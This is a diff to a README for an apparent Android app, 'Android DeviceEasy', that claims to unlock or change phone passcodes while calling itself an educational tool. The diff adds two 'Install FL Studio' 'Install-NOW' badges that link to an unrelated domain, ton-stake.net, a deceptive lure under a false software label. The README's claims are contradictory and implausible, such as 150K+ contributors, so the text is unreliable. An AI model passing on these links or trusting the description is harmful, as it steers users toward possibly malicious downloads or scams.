@@ -4,6 +4,8 @@
 
 ![Android App Banner](https://images.imyfone.com/en/assets/article/from-android/images/public/guide-1-1.jpg)  
 
+[![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net) 
+
 **Description**:  
 The program allows you to unlock or change the password code from your phone
 Discover the joy of Android development with **Android DeviceEasy** in 2025! This repository offers an open-source Android application (Java-based) designed to teach programming by automating device settings, such as toggling Wi-Fi or brightness, in a safe, authorized environment. Perfect for beginners learning Java or developers exploring Android SDK, this educational tool is customizable and supported by a community of 200K+ users and 150K+ contributors. With detailed tutorials, troubleshooting tips, and compliance with Google’s EULA, DeviceEasy is your gateway to mastering Android app development!  
@@ -38,6 +40,8 @@ This application is intended for educational purposes and authorized device mana
 - 📅 **2025 Ready**: Compatible with Android 15 and modern Android Studio.  
 
 ---
+
+[![Install FL Studio](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net) 
 
 ## 🎯 Usage Scenarios  
 
